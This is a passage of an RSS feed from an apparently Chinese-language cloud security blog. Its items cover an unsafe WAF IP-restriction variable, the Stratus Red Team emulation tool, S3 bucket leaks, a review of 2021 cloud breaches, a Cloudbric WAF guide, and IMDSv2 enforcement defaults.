&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IF RemoteAddr IN [allowed_ips] 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;AND SocketAddr = [proxy_ip]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;微软将该行为标记为预期功能而非漏洞，但存在严重设计缺陷：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;相同变量名在不同产品中行为不一致&lt;/li&gt;
&lt;li&gt;HTTP头验证被错误标记为&amp;quot;IP限制&amp;quot;&lt;/li&gt;
&lt;li&gt;默认选项存在安全风险且无明确警告&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;管理员应立即检查现有规则配置，避免依赖不安全的RemoteAddr变量。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;特别感谢Aaron James @TrustedSec的技术反馈&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Stratus Red Team：专为云环境设计的对抗模拟工具</title>
        <link>http://localhost:1313/p/stratus-red-team%E4%B8%93%E4%B8%BA%E4%BA%91%E7%8E%AF%E5%A2%83%E8%AE%BE%E8%AE%A1%E7%9A%84%E5%AF%B9%E6%8A%97%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7/</link>
        <pubDate>Mon, 04 Aug 2025 04:19:59 +0800</pubDate>
        
        <guid>http://localhost:1313/p/stratus-red-team%E4%B8%93%E4%B8%BA%E4%BA%91%E7%8E%AF%E5%A2%83%E8%AE%BE%E8%AE%A1%E7%9A%84%E5%AF%B9%E6%8A%97%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7/</guid>
        <description>&lt;p&gt;今天，我激动地发布过去几周开发的新开源项目：Stratus Red Team——一款专注于模拟云环境中常见攻击技术的对抗模拟和紫队工具。&lt;/p&gt;
&lt;h3 id=&#34;开发动机&#34;&gt;开发动机
&lt;/h3&gt;&lt;p&gt;我的职业经历大量涉及威胁检测。从学校毕业后，我首先在一家专注于终端安全的本地托管检测与响应公司从事威胁检测用例工作。后来当我转到科技公司的云安全岗位时，发现云环境中的恶意活动检测面临着相似挑战。&lt;/p&gt;
&lt;p&gt;其中一个挑战是在真实环境中复现攻击者的战术、技术和程序(TTPs)，以验证我们的日志管道和检测逻辑是否端到端正常工作。对于传统终端和本地安全，已有多个开源项目如Atomic Red Team™或MITRE Caldera。但这些工具都不是云原生构建的，缺乏对云服务商的专门支持，也缺少足够数量的云环境攻击技术。&lt;/p&gt;
&lt;h3 id=&#34;stratus-red-team介绍&#34;&gt;Stratus Red Team介绍
&lt;/h3&gt;&lt;p&gt;这个项目构想始于2021年初。得益于我在Datadog担任云安全研究员的新职位，终于得以实现。我们将其作为100%免费开源软件发布！&lt;/p&gt;
&lt;p&gt;官网：https://stratus-red-team.cloud/&lt;br&gt;
GitHub：https://github.com/DataDog/stratus-red-team&lt;/p&gt;
&lt;h3 id=&#34;技术实现原理&#34;&gt;技术实现原理
&lt;/h3&gt;&lt;h4 id=&#34;攻击技术即代码&#34;&gt;攻击技术即代码
&lt;/h4&gt;&lt;p&gt;每个攻击技术由两部分组成：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Terraform代码：描述执行攻击前需要部署的基础设施&lt;/li&gt;
&lt;li&gt;Go代码：定义技术元数据及其引爆逻辑&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;以&amp;quot;停止CloudTrail日志&amp;quot;攻击技术为例：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Terraform代码创建CloudTrail Trail和S3存储桶&lt;/li&gt;
&lt;li&gt;Go代码包含技术ID、MITRE ATT&amp;amp;CK映射，以及调用cloudtrail:StopLogging API的引爆函数&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;terraform自动化&#34;&gt;Terraform自动化
&lt;/h4&gt;&lt;p&gt;项目使用Hashicorp的terraform-exec库动态管理Terraform，无需用户预装：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;自动下载Terraform二进制到~/.stratus-red-team/terraform&lt;/li&gt;
&lt;li&gt;通过编程方式调用terraform apply/destroy&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;状态存储&#34;&gt;状态存储
&lt;/h4&gt;&lt;p&gt;工具在本地文件系统维护三种状态：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;攻击技术状态&lt;/li&gt;
&lt;li&gt;先决条件的Terraform状态&lt;/li&gt;
&lt;li&gt;Terraform输出值
存储路径：~/.stratus-red-team/[technique-id]&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;架构设计决策&#34;&gt;架构设计决策
&lt;/h3&gt;&lt;h4 id=&#34;编程语言选择&#34;&gt;编程语言选择
&lt;/h4&gt;&lt;p&gt;放弃Python选择Go的主要考量：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;强类型特性提升开发效率&lt;/li&gt;
&lt;li&gt;官方Terraform封装库支持&lt;/li&gt;
&lt;li&gt;编译时错误检查&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;代价是牺牲了动态加载用户代码的扩展性，新攻击技术必须打包到主二进制中。&lt;/p&gt;
&lt;h4 id=&#34;先决设施处理&#34;&gt;先决设施处理
&lt;/h4&gt;&lt;p&gt;采用内置Terraform代码全自动管理基础设施，当前限制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;仅支持新建资源测试&lt;/li&gt;
&lt;li&gt;不支持针对现有基础设施演练&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;合格攻击技术的标准&#34;&gt;合格攻击技术的标准
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;原子性：模拟攻击链中的单一步骤&lt;/li&gt;
&lt;li&gt;真实性：可推导出有效的威胁检测规则&lt;/li&gt;
&lt;li&gt;自包含性：不假设AWS账户的初始状态&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;未来规划&#34;&gt;未来规划
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;增加更多AWS攻击技术&lt;/li&gt;
&lt;li&gt;添加Kubernetes支持&lt;/li&gt;
&lt;li&gt;实现可选遥测功能(默认关闭)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;项目已在GitHub开源，欢迎通过Twitter或邮件提交反馈。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>亚马逊S3存储桶数据泄露风险解析：企业云安全配置漏洞的警示</title>
        <link>http://localhost:1313/p/%E4%BA%9A%E9%A9%AC%E9%80%8As3%E5%AD%98%E5%82%A8%E6%A1%B6%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E9%A3%8E%E9%99%A9%E8%A7%A3%E6%9E%90%E4%BC%81%E4%B8%9A%E4%BA%91%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%AD%A6%E7%A4%BA/</link>
        <pubDate>Mon, 04 Aug 2025 02:41:35 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BA%9A%E9%A9%AC%E9%80%8As3%E5%AD%98%E5%82%A8%E6%A1%B6%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E9%A3%8E%E9%99%A9%E8%A7%A3%E6%9E%90%E4%BC%81%E4%B8%9A%E4%BA%91%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%AD%A6%E7%A4%BA/</guid>
        <description>&lt;h3 id=&#34;风险重现亚马逊s3存储桶为何频现数据泄露&#34;&gt;风险重现：亚马逊S3存储桶为何频现数据泄露？
&lt;/h3&gt;&lt;p&gt;在本期《Risk &amp;amp; Repeat》播客中，SearchSecurity编辑团队探讨了近期通过错误配置的亚马逊S3存储桶导致的企业数据泄露事件及其应对方案。&lt;/p&gt;
&lt;h4 id=&#34;企业数据持续暴露&#34;&gt;企业数据持续暴露
&lt;/h4&gt;&lt;p&gt;近期又有多家企业数据通过亚马逊简单存储服务（S3）意外暴露。最典型案例涉及道琼斯公司，网络安全公司UpGuard发现其公开的S3存储桶包含数百万客户信息，涵盖姓名、地址、电子邮件及部分信用卡号。研究人员指出该存储桶权限设置允许任何AWS账户持有者通过资源URL下载数据，道琼斯公司将事件归因于&amp;quot;内部错误&amp;quot;。&lt;/p&gt;
&lt;p&gt;此前UpGuard还发现威瑞森（Verizon）和博思艾伦咨询公司（Booz Allen Hamilton）等企业同样存在S3存储桶配置错误问题。由于访问控制和权限设置缺失，这些数据仓库在网络上处于公开可访问状态。&lt;/p&gt;
&lt;h4 id=&#34;核心问题探讨&#34;&gt;核心问题探讨
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;配置错误如何发生？&lt;/li&gt;
&lt;li&gt;亚马逊是否应加强客户防错措施？&lt;/li&gt;
&lt;li&gt;企业安全策略为何无法阻止云数据暴露？&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;本期播客中，编辑Rob Wright与Peter Loshin深入分析了S3存储桶数据泄露的机制、后果及解决方案，同时更新了关于赛门铁克证书颁发机构业务争议的最新进展。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>2021年云安全漏洞与数据泄露回顾：从凭证泄露到S3配置错误</title>
        <link>http://localhost:1313/p/2021%E5%B9%B4%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E5%9B%9E%E9%A1%BE%E4%BB%8E%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2%E5%88%B0s3%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF/</link>
        <pubDate>Sun, 03 Aug 2025 23:09:59 +0800</pubDate>
        
        <guid>http://localhost:1313/p/2021%E5%B9%B4%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E5%9B%9E%E9%A1%BE%E4%BB%8E%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2%E5%88%B0s3%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF/</guid>
        <description>&lt;h1 id=&#34;2021年云安全漏洞与数据泄露回顾&#34;&gt;2021年云安全漏洞与数据泄露回顾
&lt;/h1&gt;&lt;h2 id=&#34;引言&#34;&gt;引言
&lt;/h2&gt;&lt;p&gt;云安全事件的实际数据往往缺乏细节，且存在幸存者偏差。本文聚焦2021年公开披露的云安全事件，不包括云服务提供商自身的漏洞。&lt;/p&gt;
&lt;h2 id=&#34;2021年趋势&#34;&gt;2021年趋势
&lt;/h2&gt;&lt;h3 id=&#34;静态凭证仍是主要初始访问途径&#34;&gt;静态凭证仍是主要初始访问途径
&lt;/h3&gt;&lt;p&gt;静态长期凭证的泄露风险极高。计算表明：假设组织有10个静态凭证，每个每天有0.01%泄露风险，2年内至少一个凭证泄露的概率达52%。&lt;/p&gt;
&lt;h4 id=&#34;实际数据泄露案例&#34;&gt;实际数据泄露案例
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Codecov&lt;/strong&gt;：公开Docker镜像包含GCP服务账户凭证，攻击者替换安装脚本窃取环境变量&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Juspay&lt;/strong&gt;：未回收的访问密钥被窃，导致3500万条支付数据泄露&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Kaspersky&lt;/strong&gt;：AWS SES令牌泄露用于发送钓鱼邮件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Upstox/MobiKwik&lt;/strong&gt;：访问密钥泄露导致350万客户KYC数据外泄&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;漏洞案例&#34;&gt;漏洞案例
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Glassdoor员工在GitHub公开AWS访问密钥&lt;/li&gt;
&lt;li&gt;BeVigil发现40款流行Android应用内嵌AWS密钥&lt;/li&gt;
&lt;li&gt;暴露的Apache Airflow实例泄露AWS凭证&lt;/li&gt;
&lt;li&gt;SEGA Europe公开S3存储桶泄露多组凭证&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;恶意软件&#34;&gt;恶意软件
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;TeamTNT团伙窃取AWS/GCP/Docker凭证&lt;/li&gt;
&lt;li&gt;攻击者利用Log4Shell漏洞窃取AWS凭证&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;公开s3存储桶问题&#34;&gt;公开S3存储桶问题
&lt;/h3&gt;&lt;p&gt;2021年公开披露的S3存储桶数据泄露案例：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;公司&lt;/th&gt;
          &lt;th&gt;数据类型&lt;/th&gt;
          &lt;th&gt;影响用户数&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Hobby Lobby&lt;/td&gt;
          &lt;td&gt;姓名/邮箱/地址/源码&lt;/td&gt;
          &lt;td&gt;&amp;gt;30万&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Decathlon Spain&lt;/td&gt;
          &lt;td&gt;姓名/邮箱/电话&lt;/td&gt;
          &lt;td&gt;&amp;gt;7.8万&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Pixlr&lt;/td&gt;
          &lt;td&gt;邮箱/哈希密码&lt;/td&gt;
          &lt;td&gt;190万&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;MobiKwik&lt;/td&gt;
          &lt;td&gt;KYC数据/交易日志&lt;/td&gt;
          &lt;td&gt;350万(KYC)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;SEGA Europe&lt;/td&gt;
          &lt;td&gt;API密钥&lt;/td&gt;
          &lt;td&gt;未披露&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;技术防护方案&#34;&gt;技术防护方案
&lt;/h2&gt;&lt;h3 id=&#34;消除静态长期凭证&#34;&gt;消除静态长期凭证
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;人类用户&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用AWS SSO或IAM角色联合&lt;/li&gt;
&lt;li&gt;通过SCP策略阻止IAM用户创建&lt;/li&gt;
&lt;li&gt;使用aws-vault加密磁盘凭证&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;应用程序&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;优先使用EC2实例角色/Lambda执行角色&lt;/li&gt;
&lt;li&gt;非AWS环境使用Hashicorp Vault&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;SaaS集成&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;创建专用IAM角色+随机ExternalID&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;扫描异常凭证&#34;&gt;扫描异常凭证
&lt;/h3&gt;&lt;p&gt;推荐工具：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;代码扫描：detect-secrets/gitleaks/truffleHog&lt;/li&gt;
&lt;li&gt;Docker扫描：SecretScanner/ggshield&lt;/li&gt;
&lt;li&gt;GitGuardian可验证AWS凭证有效性&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;修复s3存储桶配置&#34;&gt;修复S3存储桶配置
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;基础措施&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;账户发现与清单&lt;/li&gt;
&lt;li&gt;IaC扫描工具(tfsec/checkov)&lt;/li&gt;
&lt;li&gt;启用账户级S3 Public Access Block&lt;/li&gt;
&lt;li&gt;运行时扫描(Prowler/ScoutSuite)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;高级加固&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;VPC端点限制访问&lt;/li&gt;
&lt;li&gt;客户管理KMS密钥加密&lt;/li&gt;
&lt;li&gt;启用S3数据事件日志&lt;/li&gt;
&lt;li&gt;使用PMapper分析访问权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;保护实例元数据服务&#34;&gt;保护实例元数据服务
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;通过SCP强制使用IMDSv2&lt;/li&gt;
&lt;li&gt;EKS环境阻止Pod访问元数据服务&lt;/li&gt;
&lt;li&gt;利用GuardDuty检测凭证外泄&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;2021年的攻击技术并无重大创新，这反而凸显了基础安全措施的重要性。预计2022年会出现更多类似事件，攻击者可能采用更高级的持久化技术。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;特别说明：本文作者目前就职于Datadog，但本文非公司赞助内容。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>如何利用AWS服务实现DDoS防护？Cloudbric匿名IP保护规则详解</title>
        <link>http://localhost:1313/p/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8aws%E6%9C%8D%E5%8A%A1%E5%AE%9E%E7%8E%B0ddos%E9%98%B2%E6%8A%A4cloudbric%E5%8C%BF%E5%90%8Dip%E4%BF%9D%E6%8A%A4%E8%A7%84%E5%88%99%E8%AF%A6%E8%A7%A3/</link>
        <pubDate>Sun, 03 Aug 2025 22:15:06 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8aws%E6%9C%8D%E5%8A%A1%E5%AE%9E%E7%8E%B0ddos%E9%98%B2%E6%8A%A4cloudbric%E5%8C%BF%E5%90%8Dip%E4%BF%9D%E6%8A%A4%E8%A7%84%E5%88%99%E8%AF%A6%E8%A7%A3/</guid>
        <description>&lt;h1 id=&#34;哪种aws服务能帮助防御ddos攻击---cloudbric&#34;&gt;哪种AWS服务能帮助防御DDoS攻击？ - Cloudbric
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;简短回答&lt;/strong&gt;：AWS WAF——配合Cloudbric的匿名IP保护&amp;amp;Tor IP保护托管规则组&lt;/p&gt;
&lt;p&gt;本文将介绍如何通过Cloudbric的匿名IP保护和Tor IP保护规则组增强AWS WAF，有效拦截隐藏在VPN、代理服务器群和Tor网络后的第7层DDoS洪水攻击。文末将提供分步实施方案，助您提升WAF安全防护等级。&lt;/p&gt;
&lt;h2 id=&#34;为何ddos流量隐匿于匿名网络以及aws-waf的解决方案&#34;&gt;为何DDoS流量隐匿于匿名网络——以及AWS WAF的解决方案
&lt;/h2&gt;&lt;p&gt;攻击者越来越多地通过VPN、公有云IP段和Tor网络代理第7层攻击流量，以规避简单黑名单。行业研究表明，大多数Tor出口节点流量是恶意或自动化的，涉及从凭据填充到低速HTTP洪水攻击等各种行为。&lt;/p&gt;
&lt;p&gt;AWS WAF实时检查每个HTTP(S)请求，天然适合拦截这些伪装流量源。Cloudbric为AWS WAF提供的托管规则组持续更新IP信誉库，自动拦截VPN、代理、数据中心和Tor流量——无需手动维护列表或调整正则表达式。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;核心要点&lt;/strong&gt;：现代云Web安全需要将AWS WAF规则与Cloudbric匿名IP保护结合，实现应用层级的强力DDoS防护。&lt;/p&gt;
&lt;h2 id=&#34;实施前提条件&#34;&gt;实施前提条件
&lt;/h2&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;所需资源&lt;/th&gt;
          &lt;th&gt;操作步骤&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;具备WAF权限的AWS账户&lt;/td&gt;
          &lt;td&gt;创建Web ACL和托管规则&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;现有CloudFront分发或ALB&lt;/td&gt;
          &lt;td&gt;选择需要保护的资源&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;AWS Marketplace管理员权限&lt;/td&gt;
          &lt;td&gt;订阅Cloudbric产品&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;运营效益与商业价值&#34;&gt;运营效益与商业价值
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;即时缓解&lt;/strong&gt;：边缘节点级拦截在攻击到达源站前阻断&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;资源节约&lt;/strong&gt;：无需为&amp;quot;以防万一&amp;quot;过度配置计算资源或带宽&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;弹性支出&lt;/strong&gt;：安全成本与实际流量而非攻击峰值带宽挂钩&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;实时威胁情报&lt;/strong&gt;：Cloudbric研究团队持续更新IP信誉库&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;统一结算&lt;/strong&gt;：订阅费用直接计入AWS账单，无需额外供应商对接&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;aws-marketplace快速入门指南15分钟内完成&#34;&gt;AWS Marketplace快速入门指南（15分钟内完成）
&lt;/h2&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;步骤&lt;/th&gt;
          &lt;th&gt;操作&lt;/th&gt;
          &lt;th&gt;结果&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;在AWS Marketplace搜索&amp;quot;Cloudbric Managed Rules for AWS WAF&amp;quot;&lt;/td&gt;
          &lt;td&gt;查看规则组选项产品页&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;2&lt;/td&gt;
          &lt;td&gt;一键订阅并选择AWS区域&lt;/td&gt;
          &lt;td&gt;规则组将显示在您的账户中&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;3&lt;/td&gt;
          &lt;td&gt;将规则组添加至新建或现有Web ACL&lt;/td&gt;
          &lt;td&gt;立即开始拦截匿名化流量&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;客户通常只需一杯咖啡的时间就能完成从零到全面防护的部署。如果您正在从纯自定义规则迁移，只需将Cloudbric规则组设置为更高优先级即可，其他配置无需更改。&lt;/p&gt;
&lt;h2 id=&#34;核心结论&#34;&gt;核心结论
&lt;/h2&gt;&lt;p&gt;当被问及&amp;quot;哪种AWS服务有助于DDoS防护&amp;quot;时，答案很明确：
使用AWS WAF——并通过Cloudbric匿名IP和Tor IP托管规则组增强其功能。您将获得低延迟、高效率的WAF安全防护，使Web或API工作负载免受匿名化第7层DDoS攻击的威胁——而且您现在就可以通过AWS Marketplace点击几下立即部署。&lt;/p&gt;
&lt;h2 id=&#34;关于作者&#34;&gt;关于作者
&lt;/h2&gt;&lt;p&gt;Jensen是一位云安全工程师，他认为拦截恶意流量比拦截垃圾电话更有成就感。他与Cloudbric合作让AWS WAF更智能——这样您就不必自己编写100条自定义规则。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;标签&lt;/strong&gt;：aws ddos防护, aws waf规则, 云Web安全, Cloudbric, 云网络安全, AWS WAF托管规则, vs wafcharm, aws waf, waf网络安全, Web云安全&lt;/p&gt;
</description>
        </item>
        <item>
        <title>IMDSv2强制实施：即将登陆您所在的区域！</title>
        <link>http://localhost:1313/p/imdsv2%E5%BC%BA%E5%88%B6%E5%AE%9E%E6%96%BD%E5%8D%B3%E5%B0%86%E7%99%BB%E9%99%86%E6%82%A8%E6%89%80%E5%9C%A8%E7%9A%84%E5%8C%BA%E5%9F%9F/</link>
        <pubDate>Sun, 03 Aug 2025 13:07:21 +0800</pubDate>
        
        <guid>http://localhost:1313/p/imdsv2%E5%BC%BA%E5%88%B6%E5%AE%9E%E6%96%BD%E5%8D%B3%E5%B0%86%E7%99%BB%E9%99%86%E6%82%A8%E6%89%80%E5%9C%A8%E7%9A%84%E5%8C%BA%E5%9F%9F/</guid>
        <description>&lt;h3 id=&#34;imdsv2强制实施即将登陆您所在的区域&#34;&gt;IMDSv2强制实施：即将登陆您所在的区域！
&lt;/h3&gt;&lt;p&gt;3月25日，AWS发布了一项新功能，默认对新启动的EC2实例实施IMDSv2（Instance Metadata Service Version 2）。这项期待已久的功能虽然仍有改进空间，但标志着云安全的重要进步。&lt;/p&gt;
&lt;h4 id=&#34;imdsv2简介&#34;&gt;IMDSv2简介
&lt;/h4&gt;&lt;p&gt;IMDSv2是AWS于2019年11月推出的安全机制，旨在应对Capital One数据泄露事件。该事件由SSRF（服务器端请求伪造）漏洞引发，促使美国参议员致信AWS询问防护措施。IMDSv2能有效防止攻击者通过SSRF漏洞从实例元数据服务窃取凭证。&lt;/p&gt;
&lt;p&gt;2021-2022年的研究表明，此类漏洞是公开云安全事件最常见的原因之一。Nick Frichette的《保护EC2实例元数据服务》对此有深度解析。&lt;/p&gt;
&lt;h4 id=&#34;演进历程&#34;&gt;演进历程
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;初始阶段&lt;/strong&gt;：需在实例或启动模板中手动设置&lt;code&gt;metadata_options.http_tokens=&amp;quot;required&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2022年10月&lt;/strong&gt;：支持在AMI注册时指定&lt;code&gt;--imds-support v2.0&lt;/code&gt;参数&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2023年3月&lt;/strong&gt;：Amazon Linux 2023默认启用IMDSv2&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2023年11月&lt;/strong&gt;：EC2控制台&amp;quot;快速启动&amp;quot;界面默认启用&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2024年3月&lt;/strong&gt;：推出区域级默认设置功能&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;新api详解&#34;&gt;新API详解
&lt;/h4&gt;&lt;p&gt;新增的两个API允许在区域级别设置元数据默认值：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;modify_instance_metadata_defaults&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;HttpTokens&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;required&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 关键参数&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;HttpPutResponseHopLimit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;123&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
